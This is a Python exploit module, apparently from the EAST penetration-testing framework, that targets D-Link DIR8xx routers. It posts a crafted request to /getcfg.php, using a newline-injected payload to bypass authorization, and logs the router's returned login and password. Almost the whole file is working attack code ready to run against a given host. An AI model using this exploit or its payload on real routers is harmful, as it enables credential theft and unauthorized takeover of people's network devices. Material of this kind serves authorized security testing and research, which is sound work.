#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import urllib2
import time

sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_dlink_dir8xx_pd"
INFO['DESCRIPTION'] = "D-Link DIR8xx routers - credential disclosure vulnerability."
INFO['VENDOR'] = "http://www.dlink.ru/"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://embedi.com/blog/enlarge-your-botnet-top-d-link-routers-dir8xx-d-link-routers-cruisin-bruisin']
INFO["CVE Name"] = ""
INFO["NOTES"] = """
- DIR885L
- DIR890L
- DIR895L
- and others. 
phpcgi is responsible for processing requests to .php, .asp and .txt pages. Also, it checks whether a user is authorized or not. Nevertheless, if a request is crafted in a proper way, an attacker can easily bypass authorization and execute a script that returns a login and password to a router.
"""

INFO['CHANGELOG'] = "19 Sep, 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/Hardware/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS['HOST'] = '127.0.0.1', dict(description = 'Target IP')
OPTIONS["PORT"] = 80

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.port = int(self.args.get('PORT', self.port))
        self.host = self.args.get('HOST', self.host)
        
    def make_url(self, path = ''):
        return 'http://{}:{}{}'.format(self.host, self.port, path)
        
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
        
        url = self.make_url('/getcfg.php')
        data = 'A=A%0a_POST_SERVICES%3dDEVICE.ACCOUNT%0aAUTHORIZED_GROUP%3d1'
        request = urllib2.Request(url, data)
        try:
            fd = urllib2.urlopen(request)
            result = fd.read()
            self.log(result)
        except Exception as e:
            self.log(e)
            self.finish(False)
        self.finish(True)
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
